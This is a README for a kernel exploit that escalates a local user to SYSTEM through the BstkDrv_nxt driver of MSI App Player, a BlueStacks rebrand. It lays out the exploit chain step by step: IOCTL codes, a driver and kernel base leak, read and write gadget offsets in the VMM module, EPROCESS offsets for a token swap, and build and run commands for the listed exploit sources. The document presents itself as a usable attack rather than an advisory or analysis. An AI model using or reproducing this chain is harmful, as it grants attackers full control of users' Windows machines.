# MSI App Player (bluestacks) / BstkDrv_nxt

local user to system on MSI app player 5.22.261.1001. it's a bluestacks rebrand,
so the driver, the device and the gadgets are the bluestacks nxt engine. same
supdrv fork story as the rest.

- driver / device: `BstkDrv_nxt` / `\Device\BstkDrv_nxt`
- resident module: `BstkVMMR0_nxt.r0`
- built/tested on win11 26200

## files

- `bstkkaslr.c` the leak on its own: drv base, vmm base, nt base
- `bstklpe.c` the same leak plus the write: r/w to token swap to system shell
- `bstk_suptable.h` supdrv export RVAs for the base vote

## chain

`bstkkaslr` is the leak stage in isolation, `bstklpe` runs it and then does the
write.

open `\Device\BstkDrv_nxt`, COOKIE (0x228204) handshake. QUERY_FUNCS (0x228208)
export pfns voted against `bstk_suptable.h` (302 votes) gives the driver base.
LDR_OPEN (0x22820C) on `BstkVMMR0_nxt.r0` leaks the resident vmm base.
PAGE_ALLOC (0x228228) for the dual-mapped pDrvIns page, GVMMR0CreateVM for a
private gvm, then the op140 VMMR0 path (0x22826C) drives two vmm gadgets:

```
read   vmm+0x7D780   mov eax,[r8+rdx*8+8]; ret
write  vmm+0x1F17E   mov [r8],edx; ret
```

nt is easy on this one, the driver caches the pointer at drv+0x5C850 (checked as
a canonical MZ). PsInitialSystemProcess comes from the export directory, with an
RVA fallback of nt+0xFC6AF0 if the resolve misses. read system's token, walk
ActiveProcessLinks to your EPROCESS, overwrite the token, dup onto the console
session, cmd on the desktop.

offsets: pid 0x1D0, links 0x1D8, token 0x248.

## build & run

```
cl /O2 bstklpe.c /link advapi32.lib
cl /O2 bstkkaslr.c /link advapi32.lib
x86_64-w64-mingw32-gcc -O2 bstklpe.c -o bstklpe.exe -ladvapi32
bstklpe.exe
```

bluestacks / MSI app player has to have run once this boot so
`BstkVMMR0_nxt.r0` is resident and the nt cache is populated. stages validate
canonical addresses / MZ and fail quietly on a mismatch.

```
     -- _SiCk // afflicted.sh
```
